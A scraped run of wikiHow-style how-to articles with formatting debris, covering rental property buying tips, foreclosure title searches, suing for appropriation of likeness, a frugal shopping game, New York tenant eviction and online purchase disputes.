, Flat roofs are walked on by cable company installers and children that go up to get their toys. This damages the roof and it will not last as long as an inclined roof. Water collects on a flat roof and leaks are more common.

, Noise on major streets cause tenants to move more and people tend to sell drugs in allies. The noise and drug problems cause more turnover. If you buy a property on a major street, in the next few years, a bar or liquor store might open up on the same block and this attracts people on drugs that cause more turnover.

, Avoid buying properties where you pay the tenants electricity and gas. If you run an ad a little bit more and advertise that utilities are included, you now have a unit that is priced higher than the going rent and it makes vacancies longer to rent.

, Many banks will not loan on smaller units because they are hard to rent in recessions. Banks prefer to rent on larger units or units that have a variety of sized units. When I have had a tenant want to move because they want a larger unit, I talk them into waiting until a larger unit becomes available, this way I can keep good tenants. When a tenant that lost a roommate wants a smaller unit, I can talk them into staying if I have a unit available or becoming available.

, Properties on hills have more slippage of dirt and foundation slippage is more common with water problems. A big water leak will fill up a basement with water and will also cause a foundation to slip.

, When you have a desirable location, many times the friends of tenants will ask the property manager when another unit will become available. If the rent is low, I have had tenants take the unit the day it became available and paint it themselves. This way I have no loss of rent. This is a big plus if you have a low rent but the area must be very desirable.

Search the Internet for names of popular title search programs.,
Gather more information.,
Acknowledge the limitations of this free search.,
Watch out for misleading claims.",How to Begin a Title Search When Purchasing a Foreclosed Home1," There are many sources available, and a quick search online for something like “foreclosure title search” should bring them up for you.


Look in chat rooms or on Q&A message boards for references to online companies. People who have had good experiences tend to like to share. You will be likely to find users’ comments and reviews. Stick to the companies that you see noted positively by several people.;
, Sometimes, particularly with a foreclosed property, you may only have the address. If that is all you have, you can usually search for that. If you have more information, like the current owners, that sort of information can often narrow your search and provide more accuracy. Try to get this information from the bank, lender or realtor who is advertising the foreclosed property for sale., Most sites contain disclaimers that their information may not be reliable. They are performing a quick and cheap service; just realize that you get what you pay for (that is, you’re getting quick and cheap results). Use an online search as a starting point for your title review, if you wish, but you should then go do a more thorough search at the county records office, or hire an attorney or title agent to review the information with you.

, Many sites will advertise “FREE” title searches; however, what they don’t say is that something like the “preview” search is what you get for free. To see the “premium” search, you then have to pay for it. The “preview” search will contain a note like, “We found that there was an ownership change in 1985,” or “We found a mortgage dated 1991.” It won’t give you any more detail.Paying may be the correct option here, just be sure to weigh the total cost and credibility of the site against the likely gain.

Begin with as much information about the property as you can.,
Find out if your county records can be searched online.,

Verify the clear title of prior owners.,
Check for all liens that may be recorded.,
Check for any county or city code violations.,
Make copies or keep records of everything you find.",How to Begin a Title Search When Purchasing a Foreclosed Home2," It will make your title search much quicker and more accurate if you can start with some information about the prior owners and their purchase of the property, or if you know about any other liens that may be on the property. Any of this information can often be used to narrow your search and make your results more accurate.You may be able to find out much this information from the lender or realtor advertising the sale., Until recently, a title search meant going to the registry of deeds in your county and spending hours of time reviewing dusty old record books. Many county records offices or registries are now computerized and offer online searches. Check your county online, or call them to find out what they offer., Whether you are searching online or manually through record books, your objective is the same. You want to use the county records database to find the deed that shows when the current owners purchased the property. What you find should match the name and address of the information that you already know about the owners. If it doesn’t, then you either missed something, or there may be a problem with the title.

, When you find the prior deed, it should contain a reference to the deed before. Go look that up, and make sure that the information matches accurately, both in ownership and the description of the property. You will need to keep doing this back in time for several purchases at least.


If this sounds tedious, it is. But it is very important if you want to make sure that you are buying the clear title to the house. This is why most people realize that paying a couple hundred dollars for a professional title search is a good idea.

, Don’t just stop at the first mortgage. If the prior homeowner got into financial trouble, there may be more liens on the property than just the first mortgage loan. There could be a second mortgage, a repair lien, workman’s liens, etc. Keep checking the records until you are satisfied that you have found everything on record.A ""lien"" is the general term for a debt you owe someone that uses your home as collateral. If you don't pay on time, someone with a lien may have the legal right to foreclose on the home. Here are examples of some common types of liens:

A mortgage lien means that if you don't pay the bank each month, they can foreclose on the house
A tax lien means that if you fail to pay taxes, the IRS could force a sale of the house
A workman's lien means that if you have someone do substantial repairs on your house, the workman could get a lien to force payment



, If the property is violating any city or county codes, you purchase these when you buy the house. These violations should come up during the title check, but you should also check with the city code enforcement department. The good news is that you may be able to negotiate these fines down and give you time to make any repairs to correct the issues.

If the house is in bad shape, it is possible the city is fining the property for being in disrepair and affecting the desirability of the neighborhood.

, Get used to writing down the “book and page” numbers. These refer to the original source of the document that you are looking for. Any information you find may be useful to an attorney or title agent who winds up helping you.

Use your prior experience.,
Ask your attorney.,
Ask the bank that is foreclosing.",How to Begin a Title Search When Purchasing a Foreclosed Home3," If you have purchased a home before and had a good experience with a title search company, your best course of action would be to call them again.

, Most likely, if you have contacted an attorney for help on this particular purchase, they will perform the title search themselves (or a paralegal in their office). Alternatively, the attorney is likely to have some good referrals for you, for reasonably priced, and experienced title search companies that you could call.

, In a foreclosure, the bank that holds the mortgage is interested in getting the property sold and making their money back. Their primary objective is to get back the amount of their mortgage. They may or may not represent any lower-position mortgages that are recorded against the property.But if you can get in touch with a representative of the bank, they may be willing to share with you whatever information they have about liens against the property. They may also be able to refer you to a reliable title search agency."

, If you have acquaintances who have recently been through the house-buying process, see if they can give you the name of an attorney they worked with. Ask if they were pleased with the service, and get some idea of the likely cost.

, Everyone who is an attorney does not necessarily do real estate work, and every real estate attorney may not be experienced in the field of title searches. If you are going to be paying for their service, ask ahead about their experiences to find someone who will really be able to help you.

, If you conducted your own initial title search, whether through a commercial online company or by yourself through public records, it is a good idea to review the information with an attorney. For example, you may have found that a mechanic’s lien was recorded in 1995, and there was another foreclosure sale (before yours) in 2002. How will you know if that mechanic’s lien still exists?

Appropriation of name or likeness claims typically involve a media outlet or business owner using your name, photograph, or other identifying features of you for commercial gain without your consent.
Keep in mind that appropriation is a type of invasion of privacy. This means that in some states, celebrities – whether nationally or locally known – cannot sue for appropriation. Once a person's life becomes a matter of common public knowledge, those states don't recognize a right to privacy capable of being invaded.If you uploaded images of yourself to a social media network or other website, read the terms and conditions of that site carefully to determine if your use of the network or website grants a license to use your images for certain purposes.You also want to check your state's statute of limitations, which provides a deadline after which you aren't allowed to file a lawsuit. This deadline can be anywhere from one to six years after the first instance of appropriation.;
, Apply facts about the incident that gave rise to your claim and the person you want to sue to your state's appropriation law.


For example, suppose the local grocery store used a photo of you eating a watermelon in its advertisements selling fresh produce – without asking your permission. That could be a case of appropriation because they are using the image of you (your face – a protected attribute) enjoying a delicious watermelon to entice others to buy their products (an exploitative purpose – advertising and commercial gain).
The protected attribute in question doesn't have to be your full legal name, or even your full face – but whatever was used must be sufficient to cause people who saw it to recognize or associate it with you.However, in some states the types of attributes that may be protected are limited. For example, Massachusetts only protects your name, portrait, or picture, while New York also includes your voice and California also includes your signature.Consent also can be difficult, and is one of the key defenses against a lawsuit for appropriation. You must be able to prove that you did not consent to the defendant's use of your name or likeness. If you signed a release form, the defendant's use can't have been included in that release.For example, suppose the picture of you eating watermelon was taken at the county fair while you were participating in a watermelon-eating contest. You signed a release that gave the county fair permission to use any pictures taken during the contest to promote the contest. However, that release did not include permission for the grocery store to use it in advertisements. You would need to reference this release in your complaint and attach a copy of it as an exhibit.

, You must file your complaint with a court that has jurisdiction over both your claim and the person you want to sue.


Civil courts have general jurisdiction over claims of appropriation of name or likeness – these are courts in which one private individual or business can sue another. The ability to sue someone for appropriation is created by state law, but in some instances you may need to file your claim in federal court.
A federal court has jurisdiction over your state-law appropriation claim if the person or business you're suing is located in a different state than the one where you live.In addition to subject matter jurisdiction, the court also must have personal jurisdiction. This means the court must have the power to order the person you're suing to do something. Courts only have power over people who live or do business within the county or district where the court is located, or who commit the act that gave rise to your lawsuit in that county or district.
Jurisdiction generally refers to the type of court – state or federal, civil division – while venue refers to the location of the particular courthouse.For example, while your state's civil court may have jurisdiction over your case, there may be a state civil court in every county. The county you file your lawsuit in must have proper venue.
Typically a court has venue if you are suing in the location where the incident that gave rise to the claim happened.If you have trouble distinguishing venue and personal jurisdiction, keep in mind that one district may have several different courts. While all those courts may have personal jurisdiction, venue may only be proper in one of them.

, Because appropriation claims can be difficult and the law can be complex, an attorney can help protect your interests and guide you through the process.


Generally, you want to find an attorney who is experienced in representing plaintiffs in invasion of privacy lawsuits. You can begin with an internet search, or check your local bar association's website to find an attorney near you.Carefully choose an attorney based on the type of case you have, and make sure the attorney is experienced in representing people with claims just like yours. For example, if your lawsuit is against a media website, you would want to find an attorney who had experience in media law, copyright, and the First Amendment.
If you're concerned about the cost of hiring an attorney, you might check with your local legal aid society – although legal aid attorneys seldom represent plaintiffs.
When you interview prospective attorneys, be up front about your money concerns and find out what they're willing to do to help. They may be able to help you on a limited basis – for example by drafting court documents only – or work under a contingency fee agreement where you only pay the attorney if you win your case or accept a settlement., The court's local rules determine how a complaint must be formatted. You also may want to get complaints filed in the same court in other cases to use as templates.


Your local law library, typically located in the courthouse, has examples of complaints filed on various topics so you can find good ones to use.If you're using other complaints as examples or templates, be careful to tailor your complaint to your case. Some of the information contained in the complaint for another case may be irrelevant or unnecessary for yours.Some courts, including many federal courts, require you to use a special type of paper known as ""pleading paper,"" in which the margins are pre-set and all the lines are numbered down the side. If your court requires pleading paper, you can find a template online to use. Many word processing applications also have a pleading paper template.Generally, you must format and print your complaint on standard 8.5 x 11 white paper. Set one-inch margins all the way around and use a basic font such as Arial or Times New Roman in 12- or 14-point size.Some courts also may require sub-headings for each section of your complaint. Review complaints filed in other cases in the same court to see if you need to follow this format., The caption takes up roughly the top third of the first page, and identifies the case for the court.The top of the left-hand portion of the caption identifies the court in which you've filed your lawsuit. Some courts prefer this information to be centered over the entire caption.Typically, the left-hand portion of the caption is the title of the case – your name ""vs."" the defendant's name, with each party name taking a separate line above and below the ""vs.""On the right-hand side of the caption, you'll leave a blank for the case or reference number of the lawsuit, which will be assigned by the clerk when you file your complaint.In some courts, you must type the title of your document (here, ""Complaint"") under the space for the case number. In other courts, you must center your title directly over the body of your complaint., Your introduction states who you are and who you are suing, and explains how the court has jurisdiction over your case.


Above your first paragraph, you must title your document if the title was not included in the caption. Here, your title can be simply ""Complaint."" Local rules determine how your title must be styled. Often the word will be typed in all-caps, and bolded, underlined, or both.
Typically the introductory portion of your complaint constitutes the first numbered paragraphs of your complaint. Your complaint begins with a single sentence such as ""Comes now the Plaintiff, , and respectfully alleges as follows:"" and then proceeds with numbered paragraphs.Each numbered paragraph should include only a single fact. For example, the first paragraph should state your name, the state of which you are a resident, and your address. The second paragraph relates the same information about the person you are suing.Paragraphs themselves should be single-spaced, with a double space between each numbered paragraph.Following the paragraphs that identify you and the person you're suing, you should include a paragraph explaining how the court has jurisdiction over your case. The next paragraph addresses venue – why you're suing in this particular court location., To claim appropriation of name or likeness, you must state that the person you're suing used your name or likeness without your permission and gained a direct benefit as a result.


Continue with the same format as you started, providing each allegation in a separate numbered paragraph.You will start by listing relevant facts, typically in chronological order, that make up the incident that gave rise to your claim. Then you'll set forth your claims – in other words, why those facts give you a reason to sue the person under the law.Make sure you've included all elements your state law requires for a claim of appropriation of name or likeness. If you don't include facts for each element, the defendant will have a reason to file a motion asking the court to dismiss your case.

, The conclusion of your complaint asks the court to provide you with the damages you seek and any other damages the judge thinks proper.


In a court document, ""relief"" refers to the solutions or remedies the court can provide.For appropriation of name or likeness, this relief may include monetary damages, but also may include an order for the defendant to stop using your name or likeness.
The prayer for relief typically ends with a statement requesting ""any further relief which the court deems appropriate."", You must sign your complaint and provide basic contact information.


Typically you'll leave at least four blank lines and then type a line for your signature. Directly under that line, type your name. Under your name, type your mailing address and phone number.You also can include your email address if you want the court or the defendant to be able to communicate with you in that way.

, Some courts may require you to sign your complaint in front of a notary if you are filing your complaint yourself and don't have an attorney.


If required to sign in front of a notary, bring your documents along with a valid government-issued photo ID. The notary will check your ID and verify that you are the person signing the documents.
If you don't know where to find a notary, call the clerk's office and ask. There typically is a notary available at the courthouse, and many banks also have notary services available for their customers.
You must sign your complaint using blue or black ink. Some jurisdictions require blue ink, so check with the clerk if you're unsure or if the local rules don't specify.

, You typically will need a summons or certificate of service and may need other forms such as a cover sheet to accompany your complaint.A summons tells the defendant he or she must appear in court to respond to your lawsuit, while a certificate of service tells the court that you've provided the defendant with a copy of the lawsuit and how it was delivered.
Any document you reference in your complaint must be attached. If you needed to attach any documents to your complaint, such as a copy of the statements published by the defendant, you should label them as exhibits. Assign each exhibit a letter, starting with the letter ""A"" and continuing through the alphabet., You will initiate your lawsuit by filing your complaint and any related documents with the clerk of the court you want to hear your case.


Before you file your paperwork, make copies of the entire packet of documents you need to submit. You'll need at least one copy for the defendant and one for your own records.Some courts may require you to make additional copies – talk to the clerk to find out.
When you file your complaint, you must pay a filing fee, which typically will be several hundred dollars. If you can't afford this fee, you can fill out an application to have the fee waived. If your income and assets fall below a certain threshold, the court will waive the fees associated with filing the complaint or any other documents for the duration of the case., The person you're suing must have proper written notice that you have filed a lawsuit against him or her.


Technically the complaint can be delivered to the defendant by any person over the age of 18 who is unrelated to the case. Typically you would get the sheriff's department or a private process serving company to do this for you for a small fee.In some jurisdictions you also may be able to serve the defendant by sending the documents using certified mail with returned receipt requested. Typically, however, a complaint must be hand-delivered to the defendant by a person.
After the defendant has been served, you must make sure that whoever delivered the documents filled out and filed a proof of service document with the court. The clerk has forms available for this purpose., Once the defendant is served, he or she has a limited amount of time to file an answer to your lawsuit or you may be eligible to win by default.


The defendant has the opportunity to raise any and all defenses he or she may wish to use against you, as well as to assert any related counterclaims. If the defendant makes any counterclaims, you will have a deadline to file a response to those.

, You and the defendant will exchange information about the case in preparation for trial.


Typically you must make any documents you intend to use as evidence, or witnesses you plan to call, available to the defendant for review. The defendant must do likewise.
The process may include written discovery – in which you exchange written questions or requests for production – as well as depositions, which are interviews with witnesses or parties to the case. These interviews are recorded and conducted under oath., A mediator can help you settle your lawsuit without going through the time, stress, and expense of a trial.


A mediator is a neutral third party who facilitates a discussion between you and the defendant in the hopes of arriving at a mutually agreeable settlement. The proceedings are confidential and are less formal than trials.Courts often have a list of mediators or mediation agencies that are approved by the court to conduct mediations.Some jurisdictions may offer mediation services free of charge through the courts, while in others you'll have to pay the mediator a fee. However, keep in mind that the cost of mediation typically is substantially less than what you would pay to take your case to trial.Some courts also may require you to attend a settlement conference, which is somewhat like mediation only it is held before the judge who will be trying your case., You will need documents or witnesses to prove the elements of your claim of appropriation.


When you prepare your documents and other evidence for your trial, include copies of any papers and exhibits you filed with the court.
You may want to make a rough timeline of the incident that gave rise to your claim, as well as a basic outline of the facts – the same facts you included in your complaint – along with any evidence that supports those facts.
If you're claiming emotional distress, a psychological professional who has treated you can offer beneficial testimony at trial to support your claim. You also might use close friends or family members who can testify to how upset you were by the incident, or who can describe how the appropriation disrupted your life.
You also must show that the defendant stood to gain from using your name or likeness specifically – that is, that he or she chose you because your image was more valuable than any other random person's would have been.To return to the watermelon-eating contest example, if you won the watermelon-eating contest, and the grocery store subsequently used your picture to sell its produce, either claiming outright or insinuating that since you won the watermelon-eating contest you must know a thing or two about fresh produce and believed theirs was the best, this would demonstrate that your image had some special value beyond that of just anyone eating watermelon.
Your case would be even stronger in this instance if the county fair was a popular event and the winner of the watermelon-eating contest became well known around town.

, You must be in court on the date and time of your hearing or your claim will be dismissed.


You may want to consider attending a trial before the same judge before your hearing date, so you can gain some familiarity with how the judge runs his or her courtroom and the basic procedures that are followed.Prepare for your hearing by re-reading all the law that applies to your case, and all the court documents that have been filed by you and the defendant. You'll also want to review any discovery, including documents and deposition transcripts.If you plan to call witnesses to testify on your behalf, prepare questions and take time to rehearse with them so you know what their responses will be. You never want to ask a witness a question on the stand if you don't know how he or she will answer.If you're bringing documents to present as evidence, make sure you have enough copies to provide one for the judge and one for the defendant.Bring an outline of your case and notes so you don't miss anything important.You may want to practice your opening and closing statements in front of a mirror or for friends or family members until you're comfortable with what you plan to say.

, As the plaintiff, you typically have the first opportunity to tell the judge about the incident that led to your lawsuit.


When the judge calls your name, you'll be asked to present your opening statement. This is when you provide the judge with a summary of your case and what you will prove through the evidence you present and the witnesses you call.Speak clearly and loudly so the judge can hear you, and don't rush – you want the judge to be able to follow your words. If the judge asks you a question, stop speaking immediately and answer the judge's question before moving on.Make sure you address only the judge (or a witness, if you're questioning someone) – don't speak to the defendant directly., After you've presented your evidence, the person you've sued will have the opportunity to present his or her defense.


Pay attention and refrain from interrupting. Keep in mind that if the defendant calls any witnesses, you will have the opportunity to cross-examine them. Make a note of anything you want to bring up on cross-examination or about which you have further questions.After the defendant presents his or her arguments, you both will have the opportunity to speak again by giving a closing statement. Just as in your opening statement you told the judge what you were going to prove, in your closing statement you tell the judge what you've proven.

, The judge will issue his or her order after hearing both sides of the story and considering all evidence submitted.


Although the judge may issue a ruling from the bench, it may take a few days or even a few weeks to receive a written order.
If you disagree with the judge's order or believe the judge has made a legal mistake, you have a limited period of time to file a notice with the court indicating you plan to appeal – typically about 30 days after the judge's order is entered."

Keep playing until this becomes second nature.",How to Play the Need and Want Game," Basically, you are to go shopping and only come home with what you need rather than with any impulse buys or things you thought you wanted but really don't need. To win this game, there must be no wants in the stuff brought home (subject to the exceptions to the rule below).;
, This will help to give your mind the advantage over your stomach and general feelings of fatigue. It's far harder to resist purchases when you lack energy (including as a result of lack of sleep) because you're more likely to feel like you need a ""pick-me-up"" and it's far harder to excuse yourself for unnecessary purchases.

, You're more likely to win this game if you already know what you need before you go shopping.

, Start playing:


Get out your list.
Every time you see something that is not on your list and find yourself wanting to put it in your basket or cart, you have to ask yourself: Do I need this? Or do I just want this?
Stick with what you need. Every time you answer ""want"", put the item back on the shelf. Walk on.

, Make your purchases. At home, tally up how well you've done. If you have no impulse buys, purchases that were not on the list, no ""wants"", then you win. For every slip-up, you've succumbed to wants over needs.

, Whether you are trying to save money, save resources, or stop cluttering up your life, you will discover over time that this not only gets easier but makes the few times when you do buy a treat so much more exciting and rewarding than giving in to wants all of the time.

Store the tenant's property if the tenant left it in the premises.",How to Evict a Tenant in New York," You need valid reasons (also known as “grounds”) in order to dispossess a tenant. There are several eviction grounds in New York. Some of the things a tenant might do that could be reasons for eviction are:


Failing to pay rent
Substantially damaging the property (such as ripping up flooring, or breaking windows).
Significantly interfering with the comfort and safety of the landlord, or of other tenants or occupants of the same building or adjacent buildings (for example, constantly playing loud music, or discharging a firearm on the property).
Using the housing for illegal or immoral purposes (like dealing drugs or engaging in prostitution).
Violating the landlord’s policy on keeping pets.
Refusing to give the landlord access to the premises for repairs or inspection.;
, Under New York law, with every written or oral rental agreement you enter into, you warrant (guarantee) that the property will be free from any conditions which would be hazardous or detrimental to the occupants’ life, health, or safety. Some of the specific obligations are:


Keep every part of the dwelling in good repair, and clean and free from vermin, garbage, or anything else dangerous to life or health.
Make sure the interior walls of the public areas and tenant-occupied areas of a multiple dwelling (three rental units or more) are either painted or papered as often as needed to keep them in sanitary condition.
Clean carpets and rugs in the public areas of a multiple dwelling at least once a year., Removing a tenant involves an expenditure of time and money that you’d like to avoid, if possible. Try talking with your tenant. Let him or her know that you want to settle the dispute out of court, but that you'll file for eviction if necessary.

, As the landlord/property owner, you’re not allowed to serve legal papers yourself. You’ll either have to hire a professional process (legal paper) server, or have a friend who is age 18 or older do it. (Provided the friend doesn’t serve more than five legal papers a year for you.)

, Unless otherwise indicated in the law, all written notices at any stage of the eviction proceedings must be served one of three ways:


Personal service. The easiest way to serve the tenant is by having the papers handed to him or her personally. You can serve the tenant anywhere under this method, not just at home.
Substituted service. The papers can be served on a “responsible” person who lives or works in the tenant’s home. This is someone who’s likely to give the papers to the tenant. It doesn’t have to be an adult, but obviously shouldn’t be a small child either.
Conspicuous service. The person serving the papers leaves the notices on or under the door, if no one's home. Before using this method, the server must try to find the tenant at times of the day when you know it’s likely the tenant will be home. If the server can't serve the papers either by personal or substituted service the first time, he or she must try again during a different time of day (same day or different day).
Note that with both substituted service and conspicuous service, the person who served the papers also has to mail copies of them to the tenant by certified or registered mail and by regular mail. The mailings must be done by the next business day after the delivery of the papers., Papers may be served between 6:00 a.m. and 10:00 p.m. They can’t be served on Sundays or on religious observance days if you know that the tenant is observant and won’t be home., If you’re evicting the tenant for failure to pay rent (called a “non-payment case”), you need to issue a Rent Demand, informing the tenant that you want the rent paid, and that if payment isn’t made, he or she can be evicted.


The Rent Demand must tell the tenant the months and amounts of rent that are owed.
You can make the demand either orally or in writing. (Check the lease to see if it requires a written Rent Demand.) If it’s a written demand, you can't start the eviction case until at least three days after the tenant is served .If the tenant pays the rent within the three day period, you can’t proceed with the eviction., Landlord-tenant cases seeking eviction for something other than non-payment of rent (called “holdover cases”), require that you do the following:


If the tenant has done something that isn’t allowed by the lease (like having a pet), you must serve the tenant with a written notice called a Notice to Cure. This notice tells the tenant what he or she is doing wrong, and gives the tenant 10 days to fix the problem.
If the tenant doesn’t correct the problem by the deadline in the Notice to Cure, you must serve a second written notice called a Notice of Termination before you can start a case. The purpose of this notice is to end the tenancy.

The Notice of Termination tells the tenant the reason for the termination, the date the tenant must move out, and that a case will be started if the tenant isn’t out by the deadline.
If the tenant pays rent weekly, give the tenant at least seven days notice to leave.
If the tenant pays rent monthly, give at least 30 days notice to leave.
The date by which the tenant must leave must be the last day of the rental period. For example, if the tenant pays rent on the 15th of every month, the last day would be the 14th of the month., This notice has to be served on the illegal occupant; must tell the individual or individuals that they are living at the premises without your permission; and has to inform the occupant that he or she has 10 days to move out. If the occupant doesn’t move out by the deadline in the notice, you can start a holdover case., Eviction cases must be started in the court where the property is located:


If you’re in New York City, you start the complaint in Housing Court. You can find Housing Court addresses and contact information here.
If you’re outside of New York City, the complaint will be started in a District Court, City Court, Town Court, or Village Court, depending on the property location. For more information on where to start the case outside New York City, you can check here.

, To file an eviction complaint, whether for a non-payment case or a holdover case, you’ll need a Notice of Petition, a Petition to Recover Possession of Real Property, and an Affidavit of Service. The forms are slightly different for each of the two types of cases. You can get those forms on the New York Courts website here.


The Notice of Petition basically advises the tenant that the case has been filed, says what you’re asking for, and provides information as to the court location and the court date (which the court clerk will give you).
The Petition to Recover Possession lays out the reasons why the case was filed. It also contains information such as when the tenancy started, and when the tenant was supposed to vacate. You’ll also be permitted to request payment of rent arrears, interest on the arrears, and any court costs you paid.The Affidavit of Service indicates how the notices were served on the tenant.
In the Notice of Petition and Petition to Recover Possession, you have to list anyone living in the premises who’s 18 years of age or older.
Both the Petition to Recover Possession and the Affidavit of Service must be notarized. The Notice of Petition doesn’t have to be., Bring the original Notice of Petition, Petition to Recover Possession, and Affidavit of Service. Call the court clerk in advance to find out what the fee is for filing the papers. When you go to the clerk’s office, you’ll be assigned an index number that identifies your case.


Be sure to attach copies of the notices you served on the tenant (referenced in Part 1, above) to the Notice of Petition and Petition to Recover Possession.
You’re going to have to serve the tenant with the documents you just filed. The court date won’t be less than five days, or more than 12 days, from the date the tenant is served with those papers., You’ll follow the same service rules that applied when you served the initial notices.


Once you serve the papers, you must bring back the original Notice of Petition and the Affidavit of Service to the clerk’s office within three days of the hand delivery or mailing of the papers.
Bring stamps for postcards with you to give to the clerk. He or she will mail a postcard to the tenant confirming that you started a court case., If you don’t resolve your case with your tenant, you’re going to have to go to hearings in two separate parts of the court.


The first hearing takes place in the Resolution Part. This is where you and the tenant will sit down with a judge or a court attorney, who will attempt to settle your case.
The second hearing will be in the Trial Part. This happens if you don’t resolve your case in the Resolution Part. Your trial may be held that day, or you may be asked to come back for a later court date.If you settle your case at any time during your court appearance, you and the tenant will sign a Stipulation of Settlement which lays out the terms of your agreement. The judge will review this with you and the tenant to make sure everyone understands the terms., Plan on having anyone who can back up your case accompany you to court, such as someone who may have seen the tenant commit any acts that violated the terms of the lease (like damaging the property). Review their testimony with them in advance to make sure all the facts are accurate.

, If any of your key witnesses is unavailable for the court date, or if you have another valid reason why the hearing needs to be postponed (like needing an attorney), you should alert the court clerk as soon as you arrive in court. However, the court is under no obligation to postpone the case for you.

, Call the court to see when landlord-tenant cases are being heard, and go to the courthouse to see what's involved. That way, you'll have a better idea of what to expect at your own hearing.

, Make a checklist of everything you’re planning to bring, and review the checklist before going to court. Some of the items you should include are:


Proof of service of notices, the lease (if applicable), and any documentation (including any correspondence between you and the tenant), photos, or other proof to back up your claim for eviction and any money damages (such as overdue rent).
Bills for labor and materials for any work done to the property, if the tenant is claiming that you failed to make needed repairs.
Housing inspection reports, if applicable
Your Multiple Dwelling registration, if the property is a three-family house or larger., Try to arrive at least 45 minutes early, so you can find out where your case is on the court’s list (also called a “docket”). If you can’t resolve your case, and it goes to trial, the judge will hear the evidence and decide whether to grant you a judgment for eviction, which may include a provision for payment of overdue rent if you requested it. The court will provide you with a written copy of the judgment.

, If you don't win your case, you have 30 days to appeal the result. You’ll need to order a transcript of the trial.This is a typewritten document that contains everything, including testimony, that happened in the trial. You can obtain this from the transcription service for the court where the case was heard. The court clerk can give you contact information for requesting the transcript.The 30-day appeal period starts to run from the date of the service of a Notice of Entry. This is a form that indicates a judgment was entered.The winner of the case must serve the Notice of Entry, together with a copy of the judgment, on the losing party. (You can find a copy of the form here.)
The Notice of Entry can be served by regular mail, and must be served by someone (not involved in the case) who is 18 years of age or older. The person mailing the documents must complete an Affidavit of Service, which must be notarized. A copy of the affidavit is available here.
Return the Notice of Entry, Judgment, and Affidavit of Service to the court, keeping a copy for your records., If you win your case, this is the form that allows a constable, marshal or sheriff’s officer to remove the tenant from the property. This document can be obtained from the court, and needs to be signed by a judge. Either the judge will fill it out, or he or she will give it to you to fill out and bring back to the court for the judge’s signature.

, Only a constable, marshal, or sheriff’s officer can remove the tenant. Which of these you’ll use depends on where the property is located. The court clerk can provide you with the necessary contact information.When you get in touch with the officer, be sure to ask what his or her fee will be.


Once the officer receives the Warrant of Eviction, he or she will serve a Notice of Eviction on the tenant. This advises the tenant that the officer will be evicting him or her from the property.
The officer will serve the Notice of Eviction the same way you served the original notices in the case (personal service, substituted service, or conspicuous service).
If the Notice of Eviction is given by personal delivery, the officer may evict, without further notice, on the fourth business day after the date the notice was given, or on any business day after that. (Business days are Monday through Friday except legal holidays.)
If the Notice of Eviction is given by substituted delivery or conspicuous delivery, the officer may evict, without further notice, on the sixth business day after the date of the notice, or on any business day after that., You may want to be present when the tenant is removed. Contact the officer to find out when he or she is planning to arrive at the property, and if it’s okay for you to be there.


You’ll be able to change the locks once the rental property is cleaned out.
The officer is authorized to physically remove the tenant, and oversee removal of the tenant's personal property, if the tenant hasn’t already removed his or her belongings.

, New York law doesn’t specify how long you have to keep it, but 30 days is a common time period. There are certain things you might want to do to protect yourself from any later complaints by the tenant about your handling of the personal property:


Take an inventory of the property.
Let the tenant know (assuming you have contact information for the tenant) when and where the property can be picked up, and indicate that after 30 days you’ll consider the property to be legally abandoned, and will sell it. It's probably best to do this in writing if you have a forwarding address for the tenant.
Sell the property at a public sale when the 30 days has expired, after providing notice of the sale in a local circulation newspaper, and notifying the tenant of the sale (again,in writing if possible).
If the tenant owes you money for back rent, property damage, or reasonable storage costs, you can deduct the balance from the sale proceeds if the tenant's security deposit doesn't cover that amount. Consider holding aside any excess money from the sale for a year before retaining it for your own use, in case the tenant later tries to claim it."

Gather information about the transaction.,
Contact the merchant.,
Send written notice.,
Evaluate the merchant's response.,
Get any agreement in writing.,
Consider filing a complaint.",How to Resolve Internet Transaction Disputes1," Before you talk to the merchant, get all the details and documentation you have for the transaction together, so you can explain exactly how and when the problem occurred and how you'd like it resolved.Along with any email receipts or other information you received from the merchant, get copies of your bank or credit card statements that show the transaction. This evidence is particularly important if your dispute relates to the amount you were charged.
If your problem with the transaction relates to the product you were sold being defective or not living up to its description, see if you can find the product's listing on the merchant's website and take a screen-cap.
You also may want to take pictures of the item you actually received – particularly if the damage or defect is obvious.;
, Typically you can find a phone number to call with complaints or problems on the merchant's website, or in any email confirmations of your order that you received.


Be courteous and respectful to the person who answers the phone. Getting irate or insulting him or her typically won't get the situation resolved any faster.
Explain the problem you have with the transaction, providing any details the representative wants that you have available.
Depending on the issue you're having, the problem may be a result of a simple clerical error that the merchant is happy to resolve and keep you as a customer.
Merchants also don't like to be blind-sided. Even if you aren't able to resolve the problem over the phone, at least the merchant is on notice that you have an issue with the transaction. If you send a letter or take other action, it won't come as a surprise.
If you're able to resolve the dispute over the phone, be sure to ask the representative to send you written confirmation of the actions the merchant will take to eliminate the problem.

, If you are unable to resolve the problem over the phone, write and mail a letter to the merchant detailing the issue you have with the transaction and providing evidence to back up your claim.You may be able to find a sample letter you can use on the website of a government or consumer protection agency such as the Federal Trade Commission (FTC). These sample letters provide the basic format and information that should be included in your letter, although you should adapt it to fit your situation.
Include as much information as possible so the merchant can quickly find the transaction or account you're disputing. For example, if you received an email confirmation with a transaction number, include that number in your letter.
If you registered for an online account with the merchant, you should include your account information as well.
Provide factual details about the transaction and your dispute, and tell the merchant how you would like the issue resolved. Include copies of any documents or other information that back up your points.
Give the merchant a deadline to respond, and make sure you've included contact information so the merchant can get back to you. Set your deadline out far enough that the merchant has time to investigate the issue – a couple of weeks should be sufficient.
Make a copy of your letter for your records before you send it, then mail it using certified mail with returned receipt requested so you'll know when the merchant receives your letter.

, How the merchant responds to your letter will determine your next steps to resolve the dispute. If the merchant is unwilling to work with you, consider taking up the matter with your bank or credit card company.Make note of the date the merchant received your letter, and mark your deadline for a response.
You may receive a phone call from the merchant, but typically a merchant will respond to a written letter in writing. If the merchant decides to reject your argument, it typically will send you a letter explaining the reasons.

, If the merchant agrees to work with you and refund any unauthorized or duplicate charges, make sure you receive written confirmation so you can show it to your bank or credit card company if the charge remains on your account.After you hear from the merchant, you'll need to follow up with your bank or credit card company to ensure that the charges are refunded or otherwise removed from your account.
In some cases, state or federal law may require the merchant to send confirmation of the dispute resolution in writing.
Even if written confirmation isn't legally required, maintaining a written record of any agreement or resolution of the dispute will be essential if there are further problems and you have to prove the terms to which the merchant previously agreed.

